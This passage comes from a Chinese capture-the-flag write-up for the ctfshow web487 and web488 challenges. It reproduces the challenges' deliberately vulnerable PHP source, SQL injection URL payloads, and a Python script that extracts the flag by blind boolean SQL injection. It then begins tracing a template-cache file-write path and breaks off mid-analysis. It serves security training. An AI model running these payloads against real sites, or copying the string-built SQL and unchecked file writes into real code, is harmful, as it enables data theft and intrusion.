class="variable">$cache</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;db_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:29:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$addr</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;cache_class</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 21:40:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;file_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 21:23:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了看其他的也没有可以利用的点,只有sql注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from user where username = md5(&#x27;$username&#x27;) and password=md5(&#x27;1&#x27;) or 1=2#&#x27;) order by id limit 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=check&amp;username=1&#x27;) or 0 -- + # %23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410221106580.png" alt="image-20220410221106580"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=check&amp;username=1&#x27;) or 1 -- + # %23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410221119368.png" alt="image-20220410221119368"></p><p>判断</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://c2367eca-9985-48ba-b0f2-b554dad1a2a2.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;length(database())=0&quot;</span> <span class="comment">#错误</span></span><br><span class="line">payload = <span class="string">&quot;length(database())&gt;0&quot;</span> <span class="comment">#正确    返回admin</span></span><br><span class="line">params = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: f<span class="string">&quot;1&#x27;) or if(&#123;payload&#125;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> : <span class="string">&#x27;check&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">r = requests.<span class="title function_ invoke__">get</span>(url,params=params)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c2367eca-9985-48ba-b0f2-b554dad1a2a2.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(flag) from flag&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: f<span class="string">&quot;1&#x27;) or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> : <span class="string">&#x27;check&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.<span class="title function_ invoke__">get</span>(url,params=params)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span>  in r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web488"><a href="#web488" class="headerlink" title="web488"></a>web488</h1><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 11:59:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id from user where username = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;<span class="comment">#这次的sql不可用了</span></span><br><span class="line"><span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:15:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;db_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:29:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$addr</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;cache_class</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 21:40:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;file_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 21:23:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们先把目录结构写好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102110451.png" alt="image-20220411102110451"></p><p>如果sql注入不可使用的话,就只有file_class.php文件的wrrite方法可以利用了,至于为什么上一关不可利用,我们等会就知道了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102318520.png" alt="image-20220411102318520"></p><p>我们发现传了两个参数进来,一个是文件名,另一个是文件内容.我们直接转到用例ctrl+b </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102428030.png" alt="image-20220411102428030"></p><p>发现只有这一处,条件是这个传入的template文件的md5(template)文件不存在,我们接着寻找谁调用了create_cache</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102622460.png" alt="image-20220411102622460"></p><p>也是只有一处,传入了两个参数,一个文件名一个内容,条件是if后面的返回false</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102822927.png" alt="image-20220411102822927"></p><p>也就是这里没有这个md5(template)这个文件,接着回到render_class.php文件</p><p>接着往上推,发现内容cache在传入之前先调用了shade方法并且传入了数组,我们先看下面的是将参数进行替换并且替换的是,接着在替换之前有一部读取文件的操作,读取的是初始文件名,不是md5的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103133848.png" alt="image-20220411103133848"></p><p>接着我们去找谁调用了render</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103218434.png" alt="image-20220411103218434"></p><p>发现这里总共有四处,第一处仔细观察是无法利用的,因为只要你访问了一次index文件,就会在本地生成md5(index),之后就再也不会能写文件了,而下面两个并没有传入数组参数,这么说的话就没有办法进行替换操作,那么自然也就不能写文件进去,那么只剩下第二个文件了.如果这里能做的话,就只能说明error.php里面存在</p><figure class="highlight plaintext"><table><tr><td 